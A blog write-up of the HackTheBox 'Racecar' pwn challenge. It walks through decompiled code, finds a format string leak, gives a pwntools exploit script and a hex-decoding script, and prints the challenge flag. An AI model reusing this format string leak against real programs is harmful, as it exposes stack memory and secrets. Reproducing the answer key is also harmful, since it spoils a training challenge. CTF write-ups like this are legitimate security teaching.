---
title: "[HTB] Racecar Writeup \U0001F3CE️"
lang: en
cover: >-
    https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/help-you-at-solving-hackthebox-htb-challenges-machines.png
categories:
    - [HackTheBox]
    - [CTF]
tags:
    - HTB
    - Pwn
    - HackTheBox
abbrlink: 331a6b46
date: 2024-07-12 15:44:21
---

# 0x00 Challenge Info

This challenge gives us an executable file, which is a binary file. And the challenge description is as follows.

> Did you know that racecar spelled backwards is racecar? Well, now that you know everything about racing, win this race and get the flag!

Ok, nothing helps. It's just a little fun fact.

# 0x01 Analyse

So first of all, we can run the file first to see what this program works and where can be vulnerable. Enter `./racecar` on the terminal to see what's going on.

![Game info](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240712112015440.png)

As you can see, it's a racecar game. After we know what this program is, we can now check the code of this program. So I use [IDA](https://hex-rays.com/ida-pro/) to open this file, and press `tab` to see the decompiled code. I'll put the code below so if you want to see how it works you can check it out. This is the `main` function.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  unsigned int v5; // [esp+0h] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  setup();
  banner();
  info();
  while ( check )
  {
    v3 = menu();
    if ( v3 == 1 )
    {
      car_info();
    }
    else if ( v3 == 2 )
    {
      check = 0;
      car_menu();
    }
    else
    {
      printf("\n%s[-] Invalid choice!%s\n", "\x1B[1;31m", "\x1B[1;36m");
    }
  }
  return __readgsdword(0x14u) ^ v5;
}
```

Nothing special here. It's just letting the player choose their name and nickname, etc. But if you check the `car_menu` function, you can find something interesting in it.

```c
int car_menu()
{
  int v0; // eax
  int i; // eax
  unsigned int v2; // edx
  int result; // eax
  int v4; // [esp-Ch] [ebp-64h]
  int v5; // [esp-Ch] [ebp-64h]
  int v6; // [esp-Ch] [ebp-64h]
  int v7; // [esp-8h] [ebp-60h]
  int v8; // [esp-8h] [ebp-60h]
  int v9; // [esp-8h] [ebp-60h]
  int v10; // [esp-8h] [ebp-60h]
  int v11; // [esp-8h] [ebp-60h]
  int v12; // [esp-4h] [ebp-5Ch]
  int v13; // [esp+0h] [ebp-58h]
  int v14; // [esp+0h] [ebp-58h]
  int v15; // [esp+4h] [ebp-54h]
  int v16; // [esp+4h] [ebp-54h]
  unsigned int v17; // [esp+8h] [ebp-50h]
  int v18; // [esp+Ch] [ebp-4Ch]
  int v19; // [esp+10h] [ebp-48h]
  int v20; // [esp+18h] [ebp-40h]
  int v21; // [esp+1Ch] [ebp-3Ch]
  char v22[44]; // [esp+20h] [ebp-38h] BYREF
  unsigned int v23; // [esp+4Ch] [ebp-Ch]

  v23 = __readgsdword(0x14u);
  v13 = -1;
  v15 = -1;
  do
  {
    printf(&unk_1948, v4, v7);
    v18 = read_int(v13, v15);
    if ( v18 != 2 && v18 != 1 )
      printf("\n%s[-] Invalid choice!%s\n", "\x1B[1;31m", "\x1B[1;36m");
  }
  while ( v18 != 2 && v18 != 1 );
  v19 = race_type();
  v0 = time(0);
  srand(v0);
  if ( v18 == 1 && v19 == 2 || v18 == 2 && v19 == 2 )
  {
    v14 = rand() % 10;
    v16 = rand() % 100;
  }
  else if ( v18 == 1 && v19 == 1 || v18 == 2 && v19 == 1 )
  {
    v14 = rand() % 100;
    v16 = rand() % 10;
  }
  else
  {
    v14 = rand() % 100;
    v16 = rand() % 100;
  }
  v17 = 0;
  for ( i = strlen("\n[*] Waiting for the race to finish..."); ; i = strlen("\n[*] Waiting for the race to finish...") )
  {
    v2 = i;
    result = v17;
    if ( v2 <= v17 )
      break;
    putchar(aWaitingForTheR[v17]);
    if ( aWaitingForTheR[v17] == 46 )
      sleep(0);
    ++v17;
  }
  if ( v18 == 1 && (result = v14, v14 < v16) || v18 == 2 && (result = v14, v14 > v16) )
  {
    printf("%s\n\n[+] You won the race!! You get 100 coins!\n", "\x1B[1;32m", v7);
    coins += 100;
    printf("[+] Current coins: [%d]%s\n", coins, "\x1B[1;36m");
    printf("\n[!] Do you have anything to say to the press after your big victory?\n> %s", "\x1B[0m", v8);
    v20 = malloc(369);
    v21 = fopen("flag.txt", "r");
    if ( !v21 )
    {
      printf("%s[-] Could not open flag.txt. Please contact the creator.\n", "\x1B[1;31m", v9);
      exit(105, v5, v10, v12);
    }
    fgets(v22, 44, v21);
    read(0, v20, 368);
    puts("\n\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1B[0m");
    return printf(v20, v6, v11);
  }
  else if ( v18 == 1 && (result = v14, v14 > v16) || v18 == 2 && (result = v14, v14 < v16) )
  {
    printf("%s\n\n[-] You lost the race and all your coins!\n", "\x1B[1;31m", v7);
    coins = 0;
    return printf("[+] Current coins: [%d]%s\n", 0, "\x1B[1;36m");
  }
  return result;
}
```

Just in case you don't want to see the code, here's the conclusion.

1. If you choose the 1st car and 2nd race or 2nd car and 1st race, you have high opportunity to win. (But it's not important, you can just try and remember one of the winning choices.)

2. If you win, it'll let you input something and print it out.
3. Also, if you win, it'll read the `flag.txt` file but won't output them, just save it in the stack.

Since the program will shut down if it can't read the `flag.txt`, which will make us can't try the correct payload, we should make a fake flag first. Here I create a fake `flag.txt` in the current directory with `AAAAAAAA` as its content. That's because it'll make it easier for us to locate its position since it will be displayed as `41414141 41414141` in hexadecimal.

After doing that, we run the program and try to enter some malicious input after winning the game. So, I try to input `%p` to see if there's a [format string vulnerability](https://owasp.org/www-community/attacks/Format_string_attack).

![Format string vulnerability PoC](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240712150929732.png)

Voila! The program output the value of the pointer which is caused by `%p`. So now we know that there is a vulnerability to be exploited here. In the next step, we need to know where is the offset of the flag. To obtain the offset, we use a lot of `%p` to see at which the program outputs the flag, which is `41414141 41414141` in our case. Here's the output.

```txt
Select race:
1. Highway battle
2. Circuit
> 1
[*] Waiting for the race to finish...
[+] You won the race!! You get 100 coins!
[+] Current coins: [169]
[!] Do you have anything to say to the press after your big victory?
> %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this:
0x57a3d200 0x170 0x56595dfa 0x3 (nil) 0x26 0x2 0x1 0x5659696c 0x57a3d200 0x57a3d380 0x41414141 0x41414141 0xf7c5000a 0x170c0c00 0x56596d58 0x56598f8c 0xffaecf38 0x5659638d 0x56596540
```

We can see that the first part of `41414141` appears at the 12th position, so the offset is 11. Now, let's hack the planet!

# 0x02 Exploit

Since we know the offset is 11, we can easily write a Python script to exploit it.

```python
from pwn import *

r = remote(b"94.237.53.113", 39497)  # This IP is mine, you can change it to yours.
r.recvuntil(b"Name: ")
r.sendline(b"CX330")  # Doesn't matter
r.recvuntil(b"Nickname: ")
r.sendline(b"CX330")  # Doesn't matter
r.recvuntil(b">")
r.sendline(b"2")
r.recvuntil(b">")
r.sendline(b"2")
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b">")
r.sendline(b"%p " * 11 + b"\nflag: " + b"%p " * 12)
r.interactive()
```

Okay, then we got the flag in little-endian in hexadecimal. The last thing we need to do is to decode it to ASCII text so that we can submit that flag to HTB. And because the flag is now in little-endian, so remember to decode it in the right sequence. This is how I do it.

```python
hex_string = "0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368 0x6b633474 0x7d213f 0x2bf13700" # This is flag
hex_list = hex_string.split(" ")
flag = []

for hex in hex_list:
    hex = hex[2:]  # Remove the "0X" prefix
    try:
        byte_data = bytes.fromhex(hex)
        byte_data = byte_data[::-1]  # little-endian
        flag.append(byte_data.decode())
    except:
        pass
print("".join(flag))
```

# 0x03 Pwned

```txt
HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}
```
